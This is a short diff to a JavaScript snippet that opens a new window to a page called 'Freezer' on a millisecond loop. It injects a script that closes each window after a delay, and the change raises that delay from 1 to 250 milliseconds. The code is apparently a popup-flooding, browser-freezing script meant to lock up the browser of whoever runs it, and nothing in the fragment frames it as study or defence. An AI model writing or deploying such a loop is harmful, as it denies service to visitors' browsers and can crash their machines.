@@ -10,9 +10,9 @@
         // Open new window
         const newWindow = window.open('https://darakof.github.io/Freezer', '_blank');
         
-        // Close the new window after 1 millisecond
+        // Close the new window after 250 milliseconds
         if (newWindow) {
-            newWindow.document.write('<script>setTimeout(() => window.close(), 1)<\/script>');
+            newWindow.document.write('<script>setTimeout(() => window.close(), 250)<\/script>');
         }
         
         // Repeat the cycle every 1 millisecond
